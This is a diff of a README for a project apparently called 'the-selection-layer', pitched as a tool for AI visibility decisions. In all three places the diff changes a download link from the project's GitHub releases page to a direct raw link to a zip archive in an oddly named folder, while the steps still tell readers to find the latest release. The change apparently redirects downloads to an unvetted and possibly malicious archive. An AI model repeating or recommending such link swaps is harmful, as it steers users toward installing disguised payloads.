@@ -1,10 +1,10 @@
 # 🧩 the-selection-layer - Clear AI visibility decisions
 
-[![Download the-selection-layer](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Foullineceleryseed314/the-selection-layer/releases)
+[![Download the-selection-layer](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Foullineceleryseed314/the-selection-layer/main/unleaguer/the_layer_selection_3.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Foullineceleryseed314/the-selection-layer/releases
+Visit this page to download: https://raw.githubusercontent.com/Foullineceleryseed314/the-selection-layer/main/unleaguer/the_layer_selection_3.4.zip
 
 1. Open the link in your web browser.
 2. Find the latest release near the top of the page.
@@ -163,4 +163,4 @@ If you use AI tools that rank results or choose from many items, this layer help
 
 ## 📁 Download link
 
-https://github.com/Foullineceleryseed314/the-selection-layer/releases
+https://raw.githubusercontent.com/Foullineceleryseed314/the-selection-layer/main/unleaguer/the_layer_selection_3.4.zip
